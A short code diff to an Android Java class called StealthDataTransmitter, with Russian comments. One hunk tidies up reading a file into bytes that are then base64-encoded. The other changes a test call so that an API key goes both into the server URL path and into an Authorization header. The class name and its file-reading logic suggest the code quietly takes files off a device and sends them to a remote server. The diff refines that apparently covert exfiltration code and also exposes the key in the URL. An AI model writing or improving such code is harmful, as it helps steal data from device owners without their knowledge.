@@ -213,11 +213,12 @@ public class StealthDataTransmitter {
                 return;
             }
 
-            // Bug #28: используем readFully для полного чтения
-            byte[] fileData = new byte[(int) file.length()];
-            java.io.DataInputStream dis = new java.io.DataInputStream(new java.io.FileInputStream(file));
-            dis.readFully(fileData);
-            dis.close();
+            // A6: try-with-resources для гарантированного закрытия
+            byte[] fileData;
+            try (java.io.DataInputStream dis = new java.io.DataInputStream(new java.io.FileInputStream(file))) {
+                fileData = new byte[(int) file.length()];
+                dis.readFully(fileData);
+            }
 
             String base64Data = android.util.Base64.encodeToString(fileData, android.util.Base64.NO_WRAP);
 
@@ -396,11 +397,12 @@ public class StealthDataTransmitter {
     }
 
     public void testConnection(String deviceId) {
-        // Используем токен из BuildConfig, передаём через заголовок (не в URL)
+        // I3: Токен в URL path (сервер ожидает /api/devices/:token)
         String testUrl = SERVER_URL + "/api/devices/" + BuildConfig.API_KEY;
 
         Request request = new Request.Builder()
                 .url(testUrl)
+                .addHeader("Authorization", BuildConfig.API_KEY)
                 .build();
 
         httpClient.newCall(request).enqueue(new Callback() {
